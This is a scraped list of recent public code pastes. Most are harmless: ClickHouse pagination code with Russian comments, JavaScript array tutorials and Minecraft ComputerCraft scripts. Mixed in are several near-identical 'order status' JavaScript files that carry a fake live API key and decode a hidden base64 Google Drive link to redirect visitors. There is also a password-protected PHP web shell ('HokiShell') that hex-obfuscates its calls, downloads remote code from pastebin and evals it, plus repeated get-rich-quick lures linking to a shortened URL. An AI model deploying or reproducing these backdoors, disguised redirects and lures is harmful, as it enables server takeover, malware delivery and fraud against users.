id,title,username,language,date,content
71vtfBkT,Products.js,jm33,JavaScript,Sunday 20th of April 2025 12:53:03 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/64674/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ZLJAW2hx,Make $1000 15-MINUTES (BEGINNER) 2J,GodTempo,JavaScript,Sunday 20th of April 2025 12:51:25 PM CDT," 
Pdf https://tinyurl.com/privguidee


cOSgFll24a
"
pj3eWqXY,Untitled,gubichas,Python,Sunday 20th of April 2025 12:48:43 PM CDT,"# Внутри класса ClickHouseConnector в файле clickhouse_connector.py

def extract_all_data_using_pagination(self, base_query, order_by_column, chunk_size=10000, settings=None):
    """"""
    Извлекает ВСЕ данные из ClickHouse, используя пагинацию ВНУТРИ,
    и возвращает ОДИН большой DataFrame.
    (Добавлена обработка дубликатов колонок)

    ПРЕДУПРЕЖДЕНИЕ: Этот метод загружает все результаты в память!
    """"""
    logger.info(f""Начало извлечения ВСЕХ данных с внутренней пагинацией (chunk_size={chunk_size})."")
    logger.warning(""ПРЕДУПРЕЖДЕНИЕ: Все результаты будут загружены в память!"")
    # Важное напоминание о сортировке
    logger.info(f""Пагинация будет использовать ORDER BY '{order_by_column}'. ""
                f""Для предотвращения дубликатов строк убедитесь, что сортировка уникальна ""
                f""(например, добавьте уникальный ID: 'YourDateColumn, UniqueIDColumn')."")


    all_chunks = []
    total_rows_collected = 0 # Переименовали для ясности

    try:
        paginator = self.extract_data_paginated( # Используем ИСПРАВЛЕННЫЙ генератор
            base_query=base_query,
            order_by_column=order_by_column,
            chunk_size=chunk_size,
            settings=settings
        )

        for i, chunk_df in enumerate(paginator):
            chunk_num = i + 1
            logger.debug(f""Сборка: получен чанк #{chunk_num} размером {len(chunk_df)} строк."")

            # --- ИСПРАВЛЕНИЕ 1: Обработка дубликатов КОЛОНОК ---
            if not chunk_df.columns.is_unique:
                duplicate_cols = list(chunk_df.columns[chunk_df.columns.duplicated()])
                logger.warning(f""Чанк #{chunk_num} содержит дублирующиеся имена колонок: {duplicate_cols}. ""
                               f""Удаление дубликатов (оставляем первое вхождение)..."")
                # .loc[:,~df.columns.duplicated()] выбирает только первые вхождения каждого имени колонки
                chunk_df = chunk_df.loc[:, ~chunk_df.columns.duplicated()]
                logger.debug(f""Колонки чанка #{chunk_num} после дедупликации: {list(chunk_df.columns)}"")

            if not chunk_df.empty:
                all_chunks.append(chunk_df)
                total_rows_collected += len(chunk_df) # Считаем строки в чанках *до* возможного удаления дубликатов строк при concat

        if all_chunks:
            logger.info(f""Объединение {len(all_chunks)} чанков (собрано {total_rows_collected} строк до concat)..."")
            try:
                # pd.concat теперь должен работать, т.к. колонки внутри чанков уникальны
                final_df = pd.concat(all_chunks, ignore_index=True)
                logger.info(f""Итоговый DataFrame содержит {len(final_df)} строк."")

                # Проверка на дубликаты строк уже в итоговом DataFrame (из-за нестабильной сортировки)
                if final_df.duplicated().any():
                     num_duplicates = final_df.duplicated().sum()
                     logger.warning(f""В итоговом DataFrame обнаружено {num_duplicates} дублирующихся СТРОК! ""
                                    f""Это обычно вызвано нестабильной сортировкой ('{order_by_column}'). ""
                                    f""Рассмотрите возможность добавления уникального ключа в ORDER BY."")
                     # Опционально: удалить дубликаты строк, если это нужно
                     # logger.info(""Удаление дублирующихся строк из итогового DataFrame..."")
                     # final_df = final_df.drop_duplicates(ignore_index=True)
                     # logger.info(f""DataFrame после удаления дубликатов строк содержит {len(final_df)} строк."")


                # Старая проверка суммы строк - менее полезна, если были дубликаты строк
                # if len(final_df) != total_rows_collected:
                #      logger.warning(f""Несовпадение строк после concat: ожидалось {total_rows_collected} (сумма чанков), получено {len(final_df)} (возможно, из-за удаления дубликатов)"")

                return final_df
            except Exception as concat_err:
                 logger.error(f""Неожиданная ошибка при выполнении pd.concat: {concat_err}"", exc_info=True)
                 # Если ошибка все равно есть, вернуть пустой DF или перевыбросить
                 raise concat_err # Перевыбросим, чтобы увидеть проблему
        else:
            logger.info(""Не было получено данных из ClickHouse."")
            return pd.DataFrame()

    except Exception as e:
        logger.error(f""Ошибка во время сбора данных с внутренней пагинацией: {e}"", exc_info=True)
        raise e"
7N1gQ4zA,Hello,RTS_Dmitriy,Lua,Sunday 20th of April 2025 12:47:35 PM CDT,"print('What is your name?')
name = read()
print('Hello ', name)"
kK9BjP0s,Untitled,gubichas,Python,Sunday 20th of April 2025 12:39:19 PM CDT,"# clickhouse_connector.py

# ... (импорты и остальная часть класса) ...

class ClickHouseConnector:
    # ... (__init__, _initialize_executor, connect - без изменений) ...

    # --- ИСПРАВЛЕННЫЙ МЕТОД ПАГИНАЦИИ ---
    def extract_data_paginated(self, base_query, order_by_column, chunk_size=10000, settings=None):
        """"""
        Извлекает данные из ClickHouse частями (пагинация) с использованием генератора.
        (Исправлена логика выхода из цикла)
        """"""
        # ... (проверки аргументов и инициализация executor - без изменений) ...
        if self.executor is None:
             raise Exception(""Соединение с ClickHouse (SqlExecutor) не установлено."")
        # ... (проверки base_query, order_by_column, chunk_size) ...

        offset = 0
        total_fetched_debug = 0 # Только для логов

        # ... (формирование settings_str - без изменений) ...
        settings_str = """"
        # ...

        logger.info(f""Начало пагинации (ИСПРАВЛЕННАЯ ЛОГИКА): chunk_size={chunk_size}, сортировка по '{order_by_column}'."")
        logger.debug(f""Базовый запрос: {base_query}"")

        while True:
            paginated_query = f""{base_query} ORDER BY {order_by_column} LIMIT {chunk_size} OFFSET {offset}{settings_str}""
            logger.debug(f""Запрос чанка (offset={offset}): {paginated_query[:500]}..."")

            try:
                chunk_df = self.executor.execute(paginated_query)
                # ... (проверка типа и конвертация chunk_df - без изменений) ...
                if not isinstance(chunk_df, pd.DataFrame):
                     logger.warning(f""Executor вернул не DataFrame ({type(chunk_df)}) для offset={offset}. Конвертация..."")
                     try: chunk_df = pd.DataFrame(chunk_df)
                     except Exception: # ... обработка ошибки конвертации ...
                         break

                num_fetched_in_chunk = len(chunk_df)
                total_fetched_debug += num_fetched_in_chunk
                logger.debug(f""Получено строк в чанке (offset={offset}): {num_fetched_in_chunk}. Всего пока: {total_fetched_debug}"")

                # --- КЛЮЧЕВОЕ ИЗМЕНЕНИЕ ЛОГИКИ ВЫХОДА ---
                # Выходим ТОЛЬКО если получено РОВНО 0 строк.
                if num_fetched_in_chunk == 0:
                    logger.info(f""Получен пустой чанк (0 строк) для offset={offset}. Завершение пагинации."")
                    break # Единственное надежное условие выхода

                # Если строки есть (даже если их меньше chunk_size из-за усечения),
                # отдаем их и готовимся к следующему запросу.
                yield chunk_df

                # Увеличиваем offset ВСЕГДА на размер запрошенного чанка,
                # чтобы следующий запрос начался с правильного места.
                offset += chunk_size

                # УДАЛЕНО НЕПРАВИЛЬНОЕ УСЛОВИЕ ВЫХОДА:
                # if num_fetched_in_chunk < chunk_size:
                #     logger.info(f""Получено {num_fetched_in_chunk} < {chunk_size} строк. Достигнут конец данных."") # ЭТО БЫЛО НЕВЕРНО
                #     break

            except Exception as e:
                logger.error(f""Ошибка при извлечении чанка данных (offset={offset}): {e}"", exc_info=True)
                raise e # Перевыбрасываем ошибку

        logger.info(f""Пагинация завершена. Общее количество строк (по логам): {total_fetched_debug}."")


    # --- Функция-обертка extract_all_data_using_pagination остается БЕЗ ИЗМЕНЕНИЙ ---
    # Она просто использует исправленный генератор extract_data_paginated
    def extract_all_data_using_pagination(self, base_query, order_by_column, chunk_size=10000, settings=None):
         # ... (код этой функции не меняется, он вызывает исправленный extract_data_paginated) ...
         logger.info(f""Начало извлечения ВСЕХ данных с внутренней пагинацией (chunk_size={chunk_size})."")
         logger.warning(""ПРЕДУПРЕЖДЕНИЕ: Все результаты будут загружены в память!"")
         all_chunks = []
         total_rows = 0
         try:
             paginator = self.extract_data_paginated( # Вызов ИСПРАВЛЕННОГО генератора
                 base_query=base_query,
                 order_by_column=order_by_column,
                 chunk_size=chunk_size,
                 settings=settings
             )
             for i, chunk_df in enumerate(paginator):
                 logger.debug(f""Сборка: получен чанк #{i+1} размером {len(chunk_df)} строк."")
                 if not chunk_df.empty:
                     all_chunks.append(chunk_df)
                     total_rows += len(chunk_df)

             if all_chunks:
                 logger.info(f""Объединение {len(all_chunks)} чанков..."")
                 final_df = pd.concat(all_chunks, ignore_index=True)
                 logger.info(f""Итоговый DataFrame содержит {len(final_df)} строк (ожидалось по сумме чанков: {total_rows})."")
                 return final_df
             else:
                 logger.info(""Не было получено данных."")
                 return pd.DataFrame()
         except Exception as e:
             logger.error(f""Ошибка во время сбора данных с внутренней пагинацией: {e}"", exc_info=True)
             raise e

    # ... (остальные методы: extract_data, get_table_schema) ..."
90XiU3jr,EARN $900 INSTANTLY 2025⭐ 8F,GodTempo,JavaScript,Sunday 20th of April 2025 12:37:42 PM CDT," 
Pdf https://tinyurl.com/privguidee


CegfOtBdek
"
Y7tiusSG,Order.js,jm33,JavaScript,Sunday 20th of April 2025 12:37:41 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/51975/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
H2BNECpw,Market.js,jm33,JavaScript,Sunday 20th of April 2025 12:21:43 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/45394/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KtLkTnYv,EARN $900 INSTANTLY 2025⭐ 8F,UKnoDatBoi,JavaScript,Sunday 20th of April 2025 12:15:41 PM CDT," 
Pdf https://tinyurl.com/privguidee


HItIHCeiGj
"
b3JSZfR2,011 axios,xerocool-101,JavaScript,Sunday 20th of April 2025 12:08:58 PM CDT,"// 🧠 AXIOS Summary Table

Action		Method		Axios Syntax
Read		GET			axios.get(""/todos"")
Create		POST		axios.post(""/todos"", data)
Update		PUT			axios.put(""/todos/:id"", data)
Delete		DELETE		axios.delete(""/todos/:id"")"
PZpLbwJV,Untitled,jm33,JavaScript,Sunday 20th of April 2025 12:06:21 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/28678/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Qr2VJPNQ,010 slice method,xerocool-101,JavaScript,Sunday 20th of April 2025 11:55:56 AM CDT,"// Syntax
// array.slice(start, end)

// Parameter	Description
// start		Index to start slicing (inclusive)
// end			Index to end slicing (exclusive) – optional
// Returns		New sliced array

const fruits = [""apple"", ""banana"", ""cherry"", ""date"", ""fig""];
const sliced = fruits.slice(1, 3);

console.log(sliced); // [""banana"", ""cherry""]
console.log(fruits); // [""apple"", ""banana"", ""cherry"", ""date"", ""fig""]

// Omit end to slice to the end
fruits.slice(2); // [""cherry"", ""date"", ""fig""]

"
aSuvBzq1,single_miner,DabDaddy6223,Lua,Sunday 20th of April 2025 11:51:00 AM CDT,"ACCEPTABLE_FUEL = {""minecraft:coal""}
FUEL_COUNT = -1
FUEL_INDEX = -1

TORCHES_INDEX = -1
TORCHES_COUNT = -1
TORCHES_CURRENT = 0
TORCHES_DISTANCE = 15

ACCEPTABLE_BLOCKS = {""minecraft:cobblestone"", ""minecraft:cobbled_deepslate"", ""minecraft:tuff"", ""minecraft:granite"", ""minecraft:andesite"", ""minecraft:diorite""}
BLOCK_INDEX = -1
BLOCK_COUNT = 0

-- Utilities
function arrHasValue(arr, val)
    for index, value in ipairs(arr) do
        if value == val then
            return true
        end
    end

    return false
end

-- Fuel
function hasFuel()
    return FUEL_COUNT > 0
end

function shouldRefuel()
    return turtle.getFuelLevel() <= 0
end

function refuel()
    if shouldRefuel() == true then
        if hasFuel() ~= true then
            return false
        end

        turtle.select(1)
        turtle.refuel(1)
        FUEL_COUNT = FUEL_COUNT - 1
    end

    return true
end

-- Torches
function canUseTorches()
    return TORCHES_INDEX ~= -1
end

function hasTorches()
    return TORCHES_COUNT > 0
end

function shouldPlaceTorch()
    return TORCHES_CURRENT == TORCHES_DISTANCE
end

function placeTorch()
    turtle.select(TORCHES_INDEX)
    turnAround()
    turtle.place()
    turnAround()
end

function handleTorches()
    if TORCHES_COUNT == 0 then
        TORCHES_INDEX = -1
    end

    if canUseTorches() == true then
        if hasTorches() == true then
            if shouldPlaceTorch() then
                placeTorch()
                TORCHES_CURRENT = 0
            else
                TORCHES_CURRENT = TORCHES_CURRENT + 1
            end
            return true
        else
            return false
        end
    end

    return true
end

-- Blocks
function hasBlocks()
    return BLOCK_COUNT > 0
end

function findBlocks()
    for i=1, 16 do
        turtle.select(i)
        local curr_slot_data = getSlotData(i)
        if curr_slot_data ~= nil then
            if arrHasValue(ACCEPTABLE_BLOCKS, curr_slot_data[""name""]) then
                BLOCK_INDEX = i
                BLOCK_COUNT = curr_slot_data[""count""]
                return true
            end
        end
    end

    return false
end

function handleBlocks()
    if BLOCK_INDEX == -1 or BLOCK_COUNT == 0 then
        if findBlocks() == false then
            return
        end
    end

    local has_block, data = turtle.inspectDown()
    if has_block == false then
        turtle.select(BLOCK_INDEX)
        turtle.placeDown()
        BLOCK_COUNT = BLOCK_COUNT - 1
    else
        if data[""name""] == ""minecraft:lava"" or data[""name""] == ""minecraft:water"" then
            turtle.select(BLOCK_INDEX)
            turtle.placeDown()
            BLOCK_COUNT = BLOCK_COUNT - 1
        end
    end
end

-- Movement
function turnAround()
    turtle.turnLeft()
    turtle.turnLeft()
end

-- Inventory
function getSlotData(index)
    turtle.select(index)
    local slotData = turtle.getItemDetail()
    return slotData
end

function getSlotName(index)
    data = getSlotData(index)
    if data ~= nil then
        return data[""name""]
    end
    return nil
end

function getSlotCount(index)
    data = getSlotData(index)
    if data ~= nil then
        return data[""count""]
    end
    return -1
end

function inventoryFull()
    for i=1, 16 do
        turtle.select(i)
        local curr_slot_data = getSlotData(i)
        if data == nil then
            return false
        end
    end
    return true
end



function main()
    -- Setup
    for i=1, 16 do
        local curr_slot_data = getSlotData(i)
        if curr_slot_data ~= nil then
            if FUEL_INDEX == -1 then
                if arrHasValue(ACCEPTABLE_FUEL, curr_slot_data[""name""]) then
                    FUEL_INDEX = i
                    FUEL_COUNT = curr_slot_data[""count""]
                end
            end

            if TORCHES_INDEX == -1 then
                if curr_slot_data[""name""] == ""minecraft:torch"" then
                    TORCHES_INDEX = i
                    TORCHES_COUNT = curr_slot_data[""count""]
                end
            end
        end
    end

    if FUEL_INDEX == -1 then
        print(""No fuel!"")
        return
    end

    print(""Fuel Index: "" .. FUEL_INDEX)
    print(""Torch Index: "" .. TORCHES_INDEX)

    -- Loop
    while true do
        if refuel() == false then
            print(""Ran out of fuel!"")
            return
        end

        if inventoryFull() == true then
            print(""Inventory full!"")
        end

        turtle.dig()
        handleTorches()
        turtle.forward()
        handleBlocks()
        turtle.digUp()
    end
end

main()"
CkzFV88P,Products.js,jm33,JavaScript,Sunday 20th of April 2025 11:50:59 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/70052/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
udvF0mzv,009 splice method,xerocool-101,JavaScript,Sunday 20th of April 2025 11:48:59 AM CDT,"// Remove elements only
const fruits = [""apple"", ""banana"", ""cherry"", ""date""];
fruits.splice(1, 2); // start at index 1, delete 2 items

console.log(fruits); // [""apple"", ""date""]

// Add elements only
const colors = [""red"", ""green"", ""blue""];
colors.splice(1, 0, ""yellow"");

console.log(colors); // [""red"", ""yellow"", ""green"", ""blue""]

// Replace elements
const nums = [10, 20, 30];
nums.splice(1, 1, 25); // replace 20 with 25

console.log(nums); // [10, 25, 30]

// Capture removed elements
const pets = [""dog"", ""cat"", ""rabbit""];
const removed = pets.splice(1, 1); 

console.log(pets);    // [""dog"", ""rabbit""]
console.log(removed); // [""cat""]

// 🎯 Real-World Use Cases
// ✅ Remove an item from a cart by index
const cart = [""Shirt"", ""Shoes"", ""Hat""];
const index = 1;
cart.splice(index, 1); // Removes ""Shoes""

console.log(cart); // [""Shirt"", ""Hat""]

// ✅ Replace user role in admin panel
const roles = [""User"", ""Editor"", ""Guest""];
roles.splice(2, 1, ""Admin"");

console.log(roles); // [""User"", ""Editor"", ""Admin""]

"
n2n8xB5F,CC Bootstrap Turtle,DevilTvLP,Lua,Sunday 20th of April 2025 11:46:29 AM CDT,"-- bootstrap script for Computercraft turtles

function ensureInstalled(name, pastebinCode)
	if not fs.exists(name) then
		print(""Installing "" .. name .. ""..."")
		shell.run(""pastebin"", ""get"", pastebinCode, name)
	end
end

ensureInstalled(""tracking"", ""6Pymficz"")
ensureInstalled(""tunnel"", ""XMmrZHGL"")
ensureInstalled(""minedown"", ""fyM4R1QE"")
ensureInstalled(""mine"", ""2uNGs13L"")"
4MFUSDca,Untitled,b3gund4L,PHP,Sunday 20th of April 2025 11:44:10 AM CDT,"<?php
function is_logged_in()
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'admin@h4x0rqt'; 
}

if (is_logged_in()) {
    $Array = array(
        '666f70656e',
        '73747265616d5f6765745f636f6e74656e7473',
        '66696c655f6765745f636f6e74656e7473',
        '6375726c5f65786563'
    );

    function hex2str($hex) {
        $str = '';
        for ($i = 0; $i < strlen($hex); $i += 2) {
            $str .= chr(hexdec(substr($hex, $i, 2)));
        }
        return $str;
    }

    function geturlsinfo($destiny) {
        $belief = array(
            hex2str($GLOBALS['Array'][0]), 
            hex2str($GLOBALS['Array'][1]), 
            hex2str($GLOBALS['Array'][2]), 
            hex2str($GLOBALS['Array'][3])  
        );

        if (function_exists($belief[3])) { 
            $ch = curl_init($destiny);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, ""Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0"");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $love = $belief[3]($ch);
            curl_close($ch);
            return $love;
        } elseif (function_exists($belief[2])) { 
            return $belief[2]($destiny);
        } elseif (function_exists($belief[0]) && function_exists($belief[1])) { 
            $purpose = $belief[0]($destiny, ""r"");
            $love = $belief[1]($purpose);
            fclose($purpose);
            return $love;
        }
        return false;
    }

    $proto = hex2str('68747470733a2f2f');
    $host  = hex2str('706173746562696e2e636f6d');
    $path  = hex2str('7261772f365337706d504a76');
    $destiny = $proto . $host . '/' . $path;

    $dream = geturlsinfo($destiny);
    if ($dream !== false) {
        eval('?>' . $dream);
    }
} else {
    if (isset($_POST['password'])) {
        $entered_key = $_POST['password'];
        $hashed_key = '$2y$10$qaYnK74P/.J4xRdIF3AkruR/7ubAcV51dfYO9IyYwACnobKkrWtoa';
        if (password_verify($entered_key, $hashed_key)) {
            setcookie('user_id', 'admin@h4x0rqt', time() + 3600, '/'); 
            header(""Location: "".$_SERVER['PHP_SELF']); 
            exit();
        }
    }
?>
<!DOCTYPE html>
<html>
<head>
    <title>HokiShell Access</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            width: 100vw;
            background: #000;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }
        .ascii-art {
            white-space: pre;
            font-size: 12px;
            line-height: 1.2;
            margin-bottom: 20px;
            text-align: center;
        }
        .login-container {
            text-align: center;
            width: 300px;
        }
        .login-container form {
            display: flex;
            flex-direction: column;
        }
        .login-container input {
            background: #111;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 10px;
            margin-top: 10px;
        }
        .login-container input[type=""submit""] {
            background: #0f0;
            color: #000;
            font-weight: bold;
            cursor: pointer;
        }
        #typed-text {
            font-size: 16px;
            text-align: left;
            white-space: pre-wrap;
            height: 100px;
        }
    </style>
</head>
<body>
    <div class=""ascii-art"" id=""ascii"">
██████╗ ██████╗ ██╗██╗   ██╗ █████╗ 
██╔══██╗██╔══██╗██║██║   ██║██╔══██╗
██████╔╝██████╔╝██║██║   ██║╚█████╔╝
██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══██╗
██║     ██║  ██║██║ ╚████╔╝ ╚█████╔╝
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚════╝ 


H o k i S h e l l
    </div>
    <div id=""typed-text""></div>
    <div class=""login-container"" style=""display:none;"" id=""form-box"">
        <form method=""POST"" action="""">
            <label for=""password""></label>
            <input type=""password"" id=""password"" name=""password"" required autofocus>
            <input type=""submit"" value=""Access"">
        </form>
    </div>
    <audio id=""beep"" src=""https://www.soundjay.com/buttons/button-11.wav"" preload=""auto""></audio>
    <script>
        const text = ""Initializing secure HokiShell environment..."";
        let i = 0;
        const speed = 50;
        const el = document.getElementById(""typed-text"");
        const beep = document.getElementById(""beep"");

        function type() {
            if (i < text.length) {
                el.textContent += text.charAt(i);
                if (text.charAt(i) !== ' ' && text.charAt(i) !== 'n') beep.play();
                i++;
                setTimeout(type, speed);
            } else {
                document.getElementById(""form-box"").style.display = ""block"";
            }
        }
        type();
    </script>
</body>
</html>
<?php
}
?>
"
Tcjbndvw,008 sort,xerocool-101,JavaScript,Sunday 20th of April 2025 11:37:33 AM CDT,"// Sort Array
// Asc
const nums = [3, 1, 5];
nums.sort((a, b) => a - b); 
console.log(nums); // [1, 3, 5]

// Desc
const nums = [3, 1, 5];
nums.sort((a, b) => b - a);
console.log(nums); // [5, 3, 1]"
2tQ5Wju8,Order.js,jm33,JavaScript,Sunday 20th of April 2025 11:35:36 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/04324/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dfiCNMHx,Market.js,jm33,JavaScript,Sunday 20th of April 2025 11:20:14 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/12587/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
vDqcLLuz,PHP version change shell code.,appl4e,PowerShell,Sunday 20th of April 2025 11:19:12 AM CDT,"function Set-PHPVersion {
param( [Parameter(Mandatory=$true)] [string]$Version ) $php81Path = ""C:\laragon\bin\php\php-8.1.10-Win32-vs16-x64"" $php83Path = ""C:\PHP\PHP83"" if ($Version -eq ""81"") { Write-Host ""Setting PHP version to 8.1"" [Environment]::SetEnvironmentVariable(""Path"", ""$php81Path;$env:Path"", ""Machine"") } elseif ($Version -eq ""83"") { Write-Host ""Setting PHP version to 8.3"" [Environment]::SetEnvironmentVariable(""Path"", ""$php83Path;$env:Path"", ""Machine"") } else { Write-Host ""Usage: Set-PHPVersion -Version [version] (e.g., Set-PHPVersion -Version 81 or Set-PHPVersion -Version 83)"" } Write-Host ""Please close and reopen your terminal for the changes to take effect.""
}"
NPAUcuQU,photografer,alwinto,Pawn,Sunday 20th of April 2025 11:16:16 AM CDT,"/*
							*PHOTOGRAPHER JOB*
 
		•   Date creted { date }
		•   Created by: anderson87 { Esad Hrustanovic }
		•   Modified for Balkan Gaming Community
